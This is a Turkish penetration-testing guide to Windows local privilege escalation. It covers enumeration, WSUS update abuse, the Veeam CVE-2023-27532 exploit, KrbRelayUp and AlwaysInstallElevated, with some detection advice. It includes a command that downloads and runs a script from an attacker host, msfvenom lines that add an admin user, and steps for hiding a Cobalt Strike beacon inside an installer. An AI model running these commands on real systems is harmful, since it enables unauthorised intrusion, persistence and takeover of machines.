# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, temel nitelikteki çeşitli kılavuzlardan genel Windows ayrıcalık yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik enumeration akışında topluluk atölyelerinden ve kontrol listelerinden de yararlanılır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihsel saldırı materyalleri arasında Windows ayrıcalık yükseltme konulu DerbyCon sunumu da bulunur.<sup>[[5]](#references)</sup>

## Başlangıç Seviyesinde Windows Teorisi

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfaya bakın:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Denetimleri

Windows'ta **sistemi enumerate etmenizi**, executable'ları çalıştırmanızı ve hatta **faaliyetlerinizin tespit edilmesini** engelleyebilecek farklı şeyler vardır. Ayrıcalık yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı** **okuyup** tüm bu **savunma** **mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo güvenli yol denetimleri atlatıldığında istem göstermeden High IL'ye ulaşmak için kötüye kullanılabilir. UIAccess/Admin Protection bypass iş akışına özel sayfaya buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, rastgele bir SYSTEM kayıt defteri yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows sürümlerinde, ayrıcalıklı yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB rastgele port** LPE yolu da kullanıma sunuldu:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerini enumerate etme

Windows sürümünün bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploitleri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700’den fazla güvenlik açığı bulunur; bu da bir Windows ortamının sunduğu **geniş saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build’ini, yüklü güncelleştirmeleri ve olası aday güvenlik duyurularını listeler; bir sonucu geçerli kabul etmeden önce tam ürün ve yerine geçen güncelleştirmeleri doğrulayın.

Sürüme özgü bir yerel exploit için OS mimarisinin yanı sıra **çalışan sürecin mimarisini** de kontrol edin. 64-bit Windows’ta 32-bit bir süreç [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32-bit sistem dizinine yönlendirilirken `%windir%\Sysnative`, bu sürecin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64-bit bir süreçte kullanılamaz. Bir OS build’i veya eksik KB adayı, exploit’in kullanılabilir olduğunu kanıtlamaz; çalışan build’i, yüklü ya da yerine geçen güncelleştirmeyi, süreç mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit’lerin Github depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kaydedilmiş herhangi bir kimlik bilgisi veya işe yarar bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: transcript, kimlik bilgileri de dahil olmak üzere komut bağımsız değişkenlerini ve çıktıları içerebilir. Okunabilir bir transcript, yalnızca içeriği kullanılabilir, daha yüksek ayrıcalıklı bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa bir ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve betiklerin bazı kısımları dahildir. Ancak yürütme ayrıntılarının ve çıktı sonuçlarının tamamı kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerin "Transcript files" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Betik yürütülürken etkinliklerin tamamı ve içeriğin tümü kaydedilir; böylece her kod bloğu çalıştığı sırada belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur; bu kayıt adli incelemeler ve kötü amaçlı davranışların analizi için değerlidir. Yürütme sırasında tüm etkinlikler belgelenerek sürece ilişkin ayrıntılı bilgiler sağlanır.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük kaydı olayları, Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Bir HTTP WSUS endpoint'i, update-metadata interception için incelenmesi gereken bir ipucudur. Exploitation ayrıca istemcinin bu WSUS sunucusunu kullanıp kullanmadığına, saldırganın trafiği intercept edip edemediğine veya kontrol edip edemediğine ve istemcinin update trust ve kurulum politikasına bağlıdır. URL tek başına code execution olduğunu göstermez. [Microsoft, WSUS metadata için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS update olup olmadığını cmd'de aşağıdaki komutu çalıştırarak kontrol edebilirsiniz:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Veya PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Aşağıdakilerden biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulu doğrular; ancak interception'ın, kötü amaçlı güncellemelerin kabulünün veya yükseltilmiş yetkilerle kurulumun mümkün olduğunu kanıtlamaz. Değer `0` olduğunda bu politika tarafından yapılandırılmış belirli WSUS endpoint'i seçilmez.

Bu vulnerabilities'ı exploit etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — bunlar, SSL kullanmayan WSUS trafiğine 'fake' güncellemeler enjekte etmek için hazırlanmış MiTM exploit script'leridir.

Araştırmayı buradan okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu bug'ın exploit ettiği açık şudur:

> Yerel kullanıcı proxy'mizi değiştirme gücümüz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi intercept etmek ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'ı yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS hostname'i için self-signed bir certificate oluşturup bunu mevcut kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini intercept edebiliriz. WSUS, certificate üzerinde trust-on-first-use türünde doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan certificate kullanıcı tarafından güvenilir bulunuyor ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu vulnerability'ı [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla exploit edebilirsiniz (kullanıma sunulduğunda).

### WSUS yöneticisi tarafından kontrol edilen güncellemeler

Mevcut kimliğin bir WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin; ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama certificate'ına güvenmelidir. Bunu bir privilege escalation yolu olarak değerlendirmeden önce aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme suistimali: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını intercept etmekten farklı bir trust-boundary hatasıdır: ön koşul, özel bir güncellemeyi yayımlayıp onaylamak için **WSUS veritabanı (`SUSDB`) stored procedure'lerine** yeterli erişime sahip olmaktır. Uygulanabilir bir giriş yolu, bir upstream WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay etmektir. Tam ön koşullar kuruluma göre değiştiğinden, SQL administrator haklarına sahip olduğunuzu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530'dan LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi suistimal etme](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Güncelleme metadata'sını içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını kaydetme | `spSaveXMLFragment` |
| İçerik digest'ini saldırganın kontrolündeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bir bilgisayar grubu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` değerleriyle `spDeployUpdate` |

Dosya adı, digest'ler, boyut ve `CommandLineInstallation` handler'ı, içe aktarılan metadata/fragments genelinde birbiriyle tutarlı olmalıdır. İçerik URL'sini ve hedef grubunu atadıktan sonra son onay aşağıdakine benzer; örnek GUID'leri tekrar kullanmak yerine yeni güncelleme, grup ve deployment identifier'ları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı tabanlı imza atlatma

WSUS normalde rastgele imzasız yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` içindeki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bittiğinde sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin veya geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` olarak adlandırılmış değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından çalıştırılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu hazırlama ve otomasyon

`spDeployUpdate` çağrıldığında WSUS, kaydedilmiş içeriği getirir. Kaynak sunucu, BITS'in HTTP beklentilerini karşılamalıdır: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protokolü başlığını gerektirdiğini belirten WSUS senkronizasyon `EventId=364` hatasına yol açar.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), içe aktarma/parça/URL/grup/dağıtım zinciri için gereken SQL'i oluşturur, bunu çalıştırmak için değiştirilmiş bir MSSQL istemcisi içerir ve içeriği hazırlamak üzere `BitsWebServer.py` dosyasını sunar. Yetkili bir laboratuvarda kullanılabilecek en basit çalıştırma biçimi şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Katılımsız yürütme ve yeniden deneme kalıcılığı

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` içindeki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından elle seçilmesine gerek kalmadan indirilip yapılandırılan zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback process sonlandıktan hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı yinelenen yürütme kalıcılığına dönüşebilir. İstemci güncellemenin başarısız olduğunu gösterdiğinden bu yöntem dikkat çeker.<sup>[[39]](#references)</sup>

#### Tespit ve hardening pivotları

Bu zincirdeki yararlı sunucu ve istemci tarafı pivotları:<sup>[[39]](#references)</sup>

- `SUSDB` içinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` yürütmelerini denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload’larını ve beklenmedik principal’lar (özellikle bilgisayar hesabı olmayan hesaplar) tarafından yapılan dağıtımları inceleyin.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını gözden geçirin; uzantıya güvenmek yerine doğrulamayı payload uzantısı ve içerik magic’i ile ilişkilendirin.
- Windows Update yüklemesinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` ya da `.esd` adları taşıyan içeriklerden kaynaklanan PE yürütmesini veya beklenmedik alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği yerlerde veritabanı hizmetinde Authentication için Extended Protection zorunlu kılın ve veritabanı ağı erişimini WSUS sunucusu ile yetkili yönetim sistemleriyle sınırlayın. Özel güncelleme prosedürlerindeki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (yerel privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyorsa ve güncelleyici sahte bir root CA’ya veya zayıf signer denetimlerine güveniyorsa, yerel bir kullanıcı kötü amaçlı bir MSI gönderebilir ve SYSTEM hizmeti bunu yükler. Genelleştirilmiş bir teknik için (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) buraya bakın:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinden bir çekirdek yedekleme hizmeti kullanır. [Veeam’in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışında da bağlanabilir; bu nedenle gerçek adresini ve PID’sini kontrol edin.

- **Keşif**: TCP/9401’in `Veeam.Backup.Service.exe` işlemine ait olduğunu doğrulayın, ardından yüklenmiş ürünü ve yama metadatasını inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu sağlar, ancak eksiksiz yama kontrolü değildir.
- **Düzeltilmiş en düşük sürümler**: Veeam, **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini düzeltilen ilk sürümler olarak listeler; daha eski sürümler etkilenir. Dört parçalı dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel build ile daha sonraki bir yamayı ayırt edemez. Sınır build’ini düzeltilmiş olarak değerlendirmeden önce yama tanımlayıcısını [üreticinin build geçmişiyle](https://www.veeam.com/kb2680) doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC’yi gerekli Veeam DLL’leriyle aynı dizine yerleştirin, ardından yerel socket üzerinden bir SYSTEM payload’ı tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Alıntılanan PoC, ek ön koşullar karşılandığında SYSTEM olarak komut çalıştırılabildiğini gösterir; tedarikçinin güvenlik duyurusu ise kimlik bilgilerinin açığa çıkması sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay, uygun bir COM sunucusu kimlik doğrulaması yaptığında ve aktarılan principal hedef nesne üzerinde yetkilere sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini açıklar; KrbRelayUp bu yolların bazılarını otomatikleştirir. Bir RBCD zinciri, uygun delegation ve hedef nesne hakları gerektirirken shadow-credential zinciri, key-credential yazma hakları ve sertifika kimlik doğrulama yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğinden kaynaklanmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, aktarılan kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağrıyı yapan kullanıcının oturum açma türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli veya yeni kimlik bilgileriyle açılan bir oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen ACL'yi incelenmesi gereken bir durum olarak değerlendirin; pasif numaralandırma COM coercion, relay kimlik doğrulaması veya dizin yazma işlemlerini tetiklememelidir. Makine hesabına ait bir shadow credential, makine ticket'ına yol açabilir; ancak yalnızca bu hesabın gerekli dizin çoğaltma haklarına sahip olması durumunda ayrı bir DCSync yoluna da geçiş sağlayabilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) içinde **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için şuraya bakın: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

Bu 2 kayıt defteri anahtarı **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Geçerli dizinde ayrıcalıkları yükseltmek için bir Windows MSI binary'si oluşturmak üzere power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer oluşturur (bu nedenle GIU erişiminiz olması gerekir):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu aracı kullanarak MSI wrapper oluşturmayı öğrenmek için bu eğitimi okuyun. Yalnızca **komut satırlarını** **çalıştırmak** istiyorsanız "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- **AlwaysPrivesc** gibi bir proje adı girin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- 3/4. adıma (dahil edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklenen uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneğini belirleyin.
- **Install**'a sağ tıklayın ve **Add Custom Action** seçeneğini belirleyin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece installer çalıştırılır çalıştırılmaz Beacon payload'un çalışması sağlanır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

